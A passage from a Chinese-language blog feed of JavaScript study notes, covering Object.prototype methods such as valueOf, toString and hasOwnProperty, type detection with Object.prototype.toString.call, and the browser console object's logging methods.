<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">obj.valueOf() === obj <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码比较<code>obj.valueOf()</code>与<code>obj</code>本身，两者是一样的。<br><code>valueOf</code>方法的主要用途是，JavaScript 自动类型转换时会默认调用这个方法（详见《数据类型转换》一章）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line"><span class="number">1</span> + obj <span class="comment">// &quot;1[object Object]&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码将对象<code>obj</code>与数字<code>1</code>相加，这时 JavaScript 就会默认调用<code>valueOf()</code>方法，求出<code>obj</code>的值再<code>与1</code>相加。所以，如果自定义<code>valueOf</code>方法，就可以得到想要的结果。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">obj.valueOf = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> + obj <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<p>上面代码自定义了<code>obj</code>对象的<code>valueOf</code>方法，于是<code>1 + obj</code>就得到了<code>3</code>。这种方法就相当于用自定义的<code>obj.valueOf</code>，覆盖<code>Object.prototype.valueOf</code>。</p>
<h6 id="1-5-2-Object-prototype-toString"><a href="#1-5-2-Object-prototype-toString" class="headerlink" title="1.5.2 Object.prototype.toString()"></a>1.5.2 Object.prototype.toString()</h6><p><code>toString</code>方法的作用是返回一个对象的字符串形式，默认情况下返回类型字符串</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o1 = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">o1.toString() <span class="comment">// &quot;[object Object]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o2 = &#123;<span class="attr">a</span>:<span class="number">1</span>&#125;;</span><br><span class="line">o2.toString() <span class="comment">// &quot;[object Object]&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码表示，对于一个对象调用<code>toString</code>方法，会返回字符串<code>[object Object]</code>，该字符串说明对象的类型。</p>
<p>字符串<code>[object Object]</code>本身没有太大的用处，但是通过自定义<code>toString</code>方法，可以让对象在自动类型转换时，得到想要的字符串形式。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line"></span><br><span class="line">obj.toString = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;world&#x27;</span> <span class="comment">// &quot;hello world&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码表示，当对象用于字符串加法时，会自动调用<code>toString</code>方法。由于自定义了<code>toString</code>方法，所以返回字符串<code>hello world</code>。</p>
<p>数组、字符串、函数、Date 对象都分别部署了自定义的<code>toString</code>方法，覆盖了<code>Object.prototype.toString</code>方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].toString() <span class="comment">// &quot;1,2,3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;123&#x27;</span>.toString() <span class="comment">// &quot;123&quot;</span></span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">123</span>;</span><br><span class="line">&#125;).toString()</span><br><span class="line"><span class="comment">// &quot;function () &#123;</span></span><br><span class="line"><span class="comment">//   return 123;</span></span><br><span class="line"><span class="comment">// &#125;&quot;</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> <span class="built_in">Date</span>()).toString()</span><br><span class="line"><span class="comment">// &quot;Tue May 10 2016 09:11:31 GMT+0800 (CST)&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，数组、字符串、函数、Date 对象调用<code>toString</code>方法，并不会返回<code>[object Object]</code>，因为它们都自定义了<code>toString</code>方法，覆盖原始方法。</p>
<h6 id="1-5-3-toString-的应用：判断数据类型"><a href="#1-5-3-toString-的应用：判断数据类型" class="headerlink" title="1.5.3 toString() 的应用：判断数据类型"></a>1.5.3 toString() 的应用：判断数据类型</h6><p><code>Object.prototype.toString</code>方法返回对象的类型字符串，因此可以用来判断一个值的类型</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">obj.toString() <span class="comment">// &quot;[object Object]&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码调用空对象的<code>toString</code>方法，结果返回一个字符串<code>object Object</code>，其中第二个<code>Object</code>表示该值的构造函数。这是一个十分有用的判断数据类型的方法。<br>由于实例对象可能会自定义<code>toString</code>方法，覆盖掉<code>Object.prototype.toString</code>方法，所以为了得到类型字符串，最好直接使用<code>Object.prototype.toString</code>方法。通过函数的<code>call</code>方法，可以在任意值上调用这个方法，帮助我们判断这个值的类型。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.prototype.toString.call(value)</span><br></pre></td></tr></table></figure>
<p>上面代码表示对<code>value</code>这个值调用<code>Object.prototype.toString</code>方法。<br>不同数据类型的<code>Object.prototype.toString</code>方法返回值如下:</p>
<ul>
<li>数值：返回<code>[object Number]</code>。</li>
<li>字符串：返回<code>[object String]</code>。</li>
<li>布尔值：返回<code>[object Boolean]</code>。</li>
<li>undefined：返回<code>[object Undefined]</code>。</li>
<li>null：返回<code>[object Null]</code>。</li>
<li>数组：返回<code>[object Array]</code>。</li>
<li>arguments 对象：返回<code>[object Arguments]</code>。</li>
<li>函数：返回<code>[object Function]</code>。</li>
<li>Error 对象：返回<code>[object Error]</code>。</li>
<li>Date 对象：返回<code>[object Date]</code>。</li>
<li>RegExp 对象：返回<code>[object RegExp]</code>。</li>
<li>其他对象：返回<code>[object Object]</code>。</li>
</ul>
<p>这就是说，<code>Object.prototype.toString</code>可以看出一个值到底是什么类型。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="number">2</span>) <span class="comment">// &quot;[object Number]&quot;</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="string">&#x27;&#x27;</span>) <span class="comment">// &quot;[object String]&quot;</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="literal">true</span>) <span class="comment">// &quot;[object Boolean]&quot;</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="literal">undefined</span>) <span class="comment">// &quot;[object Undefined]&quot;</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="literal">null</span>) <span class="comment">// &quot;[object Null]&quot;</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="built_in">Math</span>) <span class="comment">// &quot;[object Math]&quot;</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(&#123;&#125;) <span class="comment">// &quot;[object Object]&quot;</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call([]) <span class="comment">// &quot;[object Array]&quot;</span></span><br></pre></td></tr></table></figure>
<p>利用这个特性，可以写出一个比<code>typeof</code>运算符更准确的类型判断函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> type = <span class="function"><span class="keyword">function</span> (<span class="params">o</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> s = <span class="built_in">Object</span>.prototype.toString.call(o);</span><br><span class="line">  <span class="keyword">return</span> s.match(<span class="regexp">/\[object (.*?)\]/</span>)[<span class="number">1</span>].toLowerCase();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">type(&#123;&#125;); <span class="comment">// &quot;object&quot;</span></span><br><span class="line">type([]); <span class="comment">// &quot;array&quot;</span></span><br><span class="line">type(<span class="number">5</span>); <span class="comment">// &quot;number&quot;</span></span><br><span class="line">type(<span class="literal">null</span>); <span class="comment">// &quot;null&quot;</span></span><br><span class="line">type(); <span class="comment">// &quot;undefined&quot;</span></span><br><span class="line">type(<span class="regexp">/abcd/</span>); <span class="comment">// &quot;regex&quot;</span></span><br><span class="line">type(<span class="keyword">new</span> <span class="built_in">Date</span>()); <span class="comment">// &quot;date&quot;</span></span><br></pre></td></tr></table></figure>
<p>在上面这个<code>type</code>函数的基础上，还可以加上专门判断某种类型数据的方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> type = <span class="function"><span class="keyword">function</span> (<span class="params">o</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> s = <span class="built_in">Object</span>.prototype.toString.call(o);</span><br><span class="line">  <span class="keyword">return</span> s.match(<span class="regexp">/\[object (.*?)\]/</span>)[<span class="number">1</span>].toLowerCase();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">[<span class="string">&#x27;Null&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;Undefined&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;Object&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;Array&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;String&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;Number&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;Boolean&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;Function&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;RegExp&#x27;</span></span><br><span class="line">].forEach(<span class="function"><span class="keyword">function</span> (<span class="params">t</span>) </span>&#123;</span><br><span class="line">  type[<span class="string">&#x27;is&#x27;</span> + t] = <span class="function"><span class="keyword">function</span> (<span class="params">o</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> type(o) === t.toLowerCase();</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">type.isObject(&#123;&#125;) <span class="comment">// true</span></span><br><span class="line">type.isNumber(<span class="literal">NaN</span>) <span class="comment">// true</span></span><br><span class="line">type.isRegExp(<span class="regexp">/abc/</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<h6 id="1-5-4-Object-prototype-toLocaleString"><a href="#1-5-4-Object-prototype-toLocaleString" class="headerlink" title="1.5.4 Object.prototype.toLocaleString()"></a>1.5.4 Object.prototype.toLocaleString()</h6><p><code>Object.prototype.toLocaleString</code>方法与<code>toString</code>的返回结果相同，也是返回一个值的字符串形式。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">obj.toString(obj) <span class="comment">// &quot;[object Object]&quot;</span></span><br><span class="line">obj.toLocaleString(obj) <span class="comment">// &quot;[object Object]&quot;</span></span><br></pre></td></tr></table></figure>
<p>这个方法的主要作用是留出一个接口，让各种不同的对象实现自己版本的<code>toLocaleString</code>，用来返回针对某些地域的特定的值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">  toString: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Henry Norman Bethune&#x27;</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  toLocaleString: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;白求恩&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">person.toString() <span class="comment">// Henry Norman Bethune</span></span><br><span class="line">person.toLocaleString() <span class="comment">// 白求恩</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>toString()</code>方法返回对象的一般字符串形式，<code>toLocaleString()</code>方法返回本地的字符串形式。</p>
<p>目前，主要有三个对象自定义了<code>toLocaleString</code>方法:</p>
<ul>
<li>Array.prototype.toLocaleString()</li>
<li>Number.prototype.toLocaleString()</li>
<li>Date.prototype.toLocaleString()</li>
</ul>
<p>举例来说，日期的实例对象的<code>toString</code>和<code>toLocaleString</code>返回值就不一样，而且<code>toLocaleString</code>的返回值跟用户设定的所在地域相关。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">date.toString() <span class="comment">// &quot;Tue Jan 01 2018 12:01:33 GMT+0800 (CST)&quot;</span></span><br><span class="line">date.toLocaleString() <span class="comment">// &quot;1/01/2018, 12:01:33 PM&quot;</span></span><br></pre></td></tr></table></figure>

<h6 id="1-5-5-Object-prototype-hasOwnProperty"><a href="#1-5-5-Object-prototype-hasOwnProperty" class="headerlink" title="1.5.5 Object.prototype.hasOwnProperty()"></a>1.5.5 Object.prototype.hasOwnProperty()</h6><p><code>Object.prototype.hasOwnProperty</code>方法接受一个字符串作为参数，返回一个布尔值，表示该实例对象自身是否具有该属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  p: <span class="number">123</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.hasOwnProperty(<span class="string">&#x27;p&#x27;</span>) <span class="comment">// true</span></span><br><span class="line">obj.hasOwnProperty(<span class="string">&#x27;toString&#x27;</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，对象<code>obj</code>自身具有<code>p</code>属性，所以返回<code>true</code>。<code>toString</code>属性是继承的，所以返回<code>false</code></p>
<p><code>well,that&#39;s all for today.</code></p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS标准库-Object对象</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0014</title>
    <url>/2021/05/11/%E6%89%93%E5%8D%A10014/</url>
    <content><![CDATA[<p><font color=#c0c0c0>清夜无尘，月色如银。酒斟时、须满十分。</font></p>
<h2 id="JS语法"><a href="#JS语法" class="headerlink" title="JS语法"></a>JS语法</h2><h3 id="4-JS语法-console对象与控制台"><a href="#4-JS语法-console对象与控制台" class="headerlink" title="4. JS语法-console对象与控制台"></a>4. JS语法-console对象与控制台</h3><h4 id="4-1-console对象"><a href="#4-1-console对象" class="headerlink" title="4.1 console对象"></a>4.1 console对象</h4><p><code>console</code>对象是 JavaScript 的原生对象，它有点像 Unix 系统的标准输出<code>stdout</code>和标准错误<code>stderr</code>，可以输出各种信息到控制台，并且还提供了很多有用的辅助方法。<br><code>console</code>的常见用途有两个:</p>
<ul>
<li>调试程序，显示网页代码运行时的错误信息。</li>
<li>提供了一个命令行接口，用来与网页代码互动。<span id="more"></span>
<code>console</code>对象的浏览器实现，包含在浏览器自带的开发工具之中。以 Chrome 浏览器的“开发者工具”（Developer Tools）为例，可以使用下面三种方法的打开它。</li>
</ul>
<ol>
<li>按 F12 或者Control + Shift + i（PC）/ Command + Option + i（Mac）。</li>
<li>浏览器菜单选择“工具/开发者工具”。</li>
<li>在一个页面元素上，打开右键菜单，选择其中的“Inspect Element”。</li>
</ol>
<p>打开开发者工具以后，顶端有多个面板:</p>
<ul>
<li><strong>Elements</strong>：查看网页的 HTML 源码和 CSS 代码。</li>
<li><strong>Resources</strong>：查看网页加载的各种资源文件（比如代码文件、字体文件 CSS 文件等），以及在硬盘上创建的各种内容（比如本地缓存、Cookie、Local Storage等）。</li>
<li><strong>Network</strong>：查看网页的 HTTP 通信情况。</li>
<li><strong>Sources</strong>：查看网页加载的脚本源码。</li>
<li><strong>Timeline</strong>：查看各种网页行为随时间变化的情况。</li>
<li><strong>Performance</strong>：查看网页的性能情况，比如 CPU 和内存消耗。</li>
<li><strong>Console</strong>：用来运行 JavaScript 命令。</li>
</ul>
<p>这些面板都有各自的用途，以下只介绍<code>Console</code>面板（又称为控制台）<br><code>Console</code>面板基本上就是一个命令行窗口，你可以在提示符下，键入各种命令</p>
<h4 id="4-2-console对象的静态方法"><a href="#4-2-console对象的静态方法" class="headerlink" title="4.2 console对象的静态方法"></a>4.2 console对象的静态方法</h4><p><code>console</code>对象提供的各种静态方法，用来与控制台窗口互动</p>
<h5 id="4-2-1-console-log-，console-info-，console-debug"><a href="#4-2-1-console-log-，console-info-，console-debug" class="headerlink" title="4.2.1 console.log()，console.info()，console.debug()"></a>4.2.1 console.log()，console.info()，console.debug()</h5><p><code>console.log</code>方法用于在控制台输出信息。它可以接受一个或多个参数，将它们连接起来输出。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;Hello World&#x27;</span>)</span><br><span class="line"><span class="comment">// Hello World</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"><span class="comment">// a b c</span></span><br></pre></td></tr></table></figure>
<p><code>console.log</code>方法会自动在每次输出的结尾，添加换行符</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">2</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">3</span>);</span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<p>如果第一个参数是格式字符串（使用了格式占位符），<code>console.log</code>方法将依次用后面的参数替换占位符，然后再进行输出</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27; %s + %s = %s&#x27;</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"><span class="comment">//  1 + 1 = 2</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>console.log</code>方法的第一个参数有三个占位符（<code>%s</code>），第二、三、四个参数会在显示时，依次替换掉这个三个占位符。<br><code>console.log</code>方法支持以下占位符，不同类型的数据必须使用对应的占位符</p>
<ul>
<li><code>%s</code> 字符串</li>
<li><code>%d</code> 整数</li>
<li><code>%i</code> 整数</li>
<li><code>%f</code> 浮点数</li>
<li><code>%o</code> 对象的链接</li>
<li><code>%c</code> CSS 格式字符串</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> number = <span class="number">11</span> * <span class="number">9</span>;</span><br><span class="line"><span class="keyword">var</span> color = <span class="string">&#x27;red&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;%d %s balloons&#x27;</span>, number, color);</span><br><span class="line"><span class="comment">// 99 red balloons</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，第二个参数是数值，对应的占位符是<code>%d</code>，第三个参数是字符串，对应的占位符是<code>%s</code>。<br>使用<code>%c</code>占位符时，对应的参数必须是 CSS 代码，用来对输出内容进行 CSS 渲染。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(</span><br><span class="line">  <span class="string">&#x27;%cThis text is styled!&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;color: red; background: yellow; font-size: 24px;&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>上面代码运行后，输出的内容将显示为黄底红字。<br><code>console.log</code>方法的两种参数格式，可以结合在一起使用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27; %s + %s &#x27;</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="string">&#x27;= 2&#x27;</span>)</span><br><span class="line"><span class="comment">// 1 + 1  = 2</span></span><br></pre></td></tr></table></figure>
<p>如果参数是一个对象，<code>console.log</code>会显示该对象的值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(&#123;<span class="attr">foo</span>: <span class="string">&#x27;bar&#x27;</span>&#125;)</span><br><span class="line"><span class="comment">// Object &#123;foo: &quot;bar&quot;&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Date</span>)</span><br><span class="line"><span class="comment">// function Date() &#123; [native code] &#125;</span></span><br></pre></td></tr></table></figure>
<p>上面代码输出<code>Date</code>对象的值，结果为一个构造函数。<br><code>console.info</code>是<code>console.log</code>方法的别名，用法完全一样。只不过<code>console.info</code>方法会在输出信息的前面，加上一个蓝色图标<br><code>console.debug</code>方法与<code>console.log</code>方法类似，会在控制台输出调试信息。但是，默认情况下，<code>console.debug</code>输出的信息不会显示，只有在打开显示级别在<code>verbose</code>的情况下，才会显示<br><code>console</code>对象的所有方法，都可以被覆盖。因此，可以按照自己的需要，定义<code>console.log</code>方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;info&#x27;</span>, <span class="string">&#x27;warn&#x27;</span>, <span class="string">&#x27;error&#x27;</span>].forEach(<span class="function"><span class="keyword">function</span>(<span class="params">method</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>[method] = <span class="built_in">console</span>[method].bind(</span><br><span class="line">    <span class="built_in">console</span>,</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">Date</span>().toISOString()</span><br><span class="line">  );</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;出错了！&quot;</span>);</span><br><span class="line"><span class="comment">// 2014-05-18T09:00.000Z 出错了！</span></span><br></pre></td></tr></table></figure>
<p>上面代码表示，使用自定义的<code>console.log</code>方法，可以在显示结果添加当前时间</p>
<h5 id="4-2-2-console-warn-console-error"><a href="#4-2-2-console-warn-console-error" class="headerlink" title="4.2.2 console.warn(),console.error()"></a>4.2.2 console.warn(),console.error()</h5><p><code>warn</code>方法和<code>error</code>方法也是在控制台输出信息，它们与<code>log</code>方法的不同之处在于，<code>warn</code>方法输出信息时，在最前面加一个黄色三角，表示警告；<code>error</code>方法输出信息时，在最前面加一个红色的叉，表示出错。同时，还会高亮显示输出文字和错误发生的堆栈。其他方面都一样。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.error(<span class="string">&#x27;Error: %s (%i)&#x27;</span>, <span class="string">&#x27;Server is not responding&#x27;</span>, <span class="number">500</span>)</span><br><span class="line"><span class="comment">// Error: Server is not responding (500)</span></span><br><span class="line"><span class="built_in">console</span>.warn(<span class="string">&#x27;Warning! Too few nodes (%d)&#x27;</span>, <span class="built_in">document</span>.childNodes.length)</span><br><span class="line"><span class="comment">// Warning! Too few nodes (1)</span></span><br></pre></td></tr></table></figure>
<p>可以这样理解，<code>log</code>方法是写入标准输出（<code>stdout</code>），<code>warn</code>方法和<code>error</code>方法是写入标准错误（<code>stderr</code>）</p>
<h5 id="4-2-3-console-table"><a href="#4-2-3-console-table" class="headerlink" title="4.2.3 console.table()"></a>4.2.3 console.table()</h5><p>对于某些复合类型的数据，<code>console.table</code>方法可以将其转为表格显示</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> languages = [</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&quot;JavaScript&quot;</span>, <span class="attr">fileExtension</span>: <span class="string">&quot;.js&quot;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&quot;TypeScript&quot;</span>, <span class="attr">fileExtension</span>: <span class="string">&quot;.ts&quot;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&quot;CoffeeScript&quot;</span>, <span class="attr">fileExtension</span>: <span class="string">&quot;.coffee&quot;</span> &#125;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.table(languages);</span><br><span class="line">------------</span><br><span class="line"><span class="keyword">var</span> languages = &#123;</span><br><span class="line">  csharp: &#123; <span class="attr">name</span>: <span class="string">&quot;C#&quot;</span>, <span class="attr">paradigm</span>: <span class="string">&quot;object-oriented&quot;</span> &#125;,</span><br><span class="line">  fsharp: &#123; <span class="attr">name</span>: <span class="string">&quot;F#&quot;</span>, <span class="attr">paradigm</span>: <span class="string">&quot;functional&quot;</span> &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.table(languages);</span><br></pre></td></tr></table></figure>

<h5 id="4-2-4-console-count"><a href="#4-2-4-console-count" class="headerlink" title="4.2.4 console.count()"></a>4.2.4 console.count()</h5><p><code>count</code>方法用于计数，输出它被调用了多少次</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">greet</span>(<span class="params">user</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.count();</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;hi &#x27;</span> + user;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">greet(<span class="string">&#x27;bob&#x27;</span>)</span><br><span class="line"><span class="comment">//  : 1</span></span><br><span class="line"><span class="comment">// &quot;hi bob&quot;</span></span><br><span class="line"></span><br><span class="line">greet(<span class="string">&#x27;alice&#x27;</span>)</span><br><span class="line"><span class="comment">//  : 2</span></span><br><span class="line"><span class="comment">// &quot;hi alice&quot;</span></span><br><span class="line"></span><br><span class="line">greet(<span class="string">&#x27;bob&#x27;</span>)</span><br><span class="line"><span class="comment">//  : 3</span></span><br><span class="line"><span class="comment">// &quot;hi bob&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码每次调用<code>greet</code>函数，内部的<code>console.count</code>方法就输出执行次数<br>该方法可以接受一个字符串作为参数，作为标签，对执行次数进行分类</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">greet</span>(<span class="params">user</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.count(user);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;hi &quot;</span> + user;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">greet(<span class="string">&#x27;bob&#x27;</span>)</span><br><span class="line"><span class="comment">// bob: 1</span></span><br><span class="line"><span class="comment">// &quot;hi bob&quot;</span></span><br><span class="line"></span><br><span class="line">greet(<span class="string">&#x27;alice&#x27;</span>)</span><br><span class="line"><span class="comment">// alice: 1</span></span><br><span class="line"><span class="comment">// &quot;hi alice&quot;</span></span><br><span class="line"></span><br><span class="line">greet(<span class="string">&#x27;bob&#x27;</span>)</span><br><span class="line"><span class="comment">// bob: 2</span></span><br><span class="line"><span class="comment">// &quot;hi bob&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码根据参数的不同，显示<code>bob</code>执行了两次，<code>alice</code>执行了一次</p>
<h5 id="4-2-5-console-dir-console-dirxml"><a href="#4-2-5-console-dir-console-dirxml" class="headerlink" title="4.2.5 console.dir(),console.dirxml()"></a>4.2.5 console.dir(),console.dirxml()</h5><p><code>dir</code>方法用来对一个对象进行检查（inspect），并以易于阅读和打印的格式显示</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(&#123;<span class="attr">f1</span>: <span class="string">&#x27;foo&#x27;</span>, <span class="attr">f2</span>: <span class="string">&#x27;bar&#x27;</span>&#125;)</span><br><span class="line"><span class="comment">// Object &#123;f1: &quot;foo&quot;, f2: &quot;bar&quot;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.dir(&#123;<span class="attr">f1</span>: <span class="string">&#x27;foo&#x27;</span>, <span class="attr">f2</span>: <span class="string">&#x27;bar&#x27;</span>&#125;)</span><br><span class="line"><span class="comment">// Object</span></span><br><span class="line"><span class="comment">//   f1: &quot;foo&quot;</span></span><br><span class="line"><span class="comment">//   f2: &quot;bar&quot;</span></span><br><span class="line"><span class="comment">//   __proto__: Object</span></span><br></pre></td></tr></table></figure>
<p>上面代码显示dir方法的输出结果，比log方法更易读，信息也更丰富<br>该方法对于输出 DOM 对象非常有用，因为会显示 DOM 对象的所有属性</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.dir(<span class="built_in">document</span>.body)</span><br></pre></td></tr></table></figure>
<p>Node 环境之中，还可以指定以代码高亮的形式输出</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.dir(obj, &#123;<span class="attr">colors</span>: <span class="literal">true</span>&#125;)</span><br></pre></td></tr></table></figure>
<p><code>dirxml</code>方法主要用于以目录树的形式，显示 DOM 节点</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.dirxml(<span class="built_in">document</span>.body)</span><br></pre></td></tr></table></figure>
<p>如果参数不是 DOM 节点，而是普通的 JavaScript 对象，<code>console.dirxml</code>等同于<code>console.dir</code></p>
